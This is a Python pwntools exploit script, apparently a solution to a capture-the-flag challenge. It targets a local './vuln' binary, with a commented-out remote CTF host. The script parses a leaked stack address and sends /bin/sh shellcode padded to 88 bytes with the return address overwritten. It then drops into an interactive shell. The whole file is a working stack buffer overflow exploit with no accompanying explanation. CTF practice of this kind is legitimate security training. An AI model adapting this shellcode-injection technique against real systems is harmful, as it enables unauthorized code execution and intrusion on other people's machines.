from pwn import *

context.arch = 'amd64'

p = process('./vuln')
# p = remote('challs.watctf.org', 1991)

line = p.recvline().decode().strip()
print(line)

shell_addr = int(line.split()[-1], 16)
print(hex(shell_addr))
shell = asm(shellcraft.sh())
payload = shell + b'a'*(88 - len(shell)) + p64(shell_addr)

p.sendline(payload)
p.interactive()
